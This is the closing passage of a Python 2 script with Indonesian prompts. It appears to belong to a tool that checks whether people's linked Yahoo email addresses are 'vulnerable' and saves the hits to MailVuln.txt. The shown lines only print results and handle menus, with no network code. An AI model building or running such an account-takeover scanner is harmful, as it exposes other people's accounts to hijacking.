                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()




############
# mengirim komen
#def pesan():



##########################################################################
#

if __name__ == '__main__':

	baliho()
	main()

#
##########################################################################
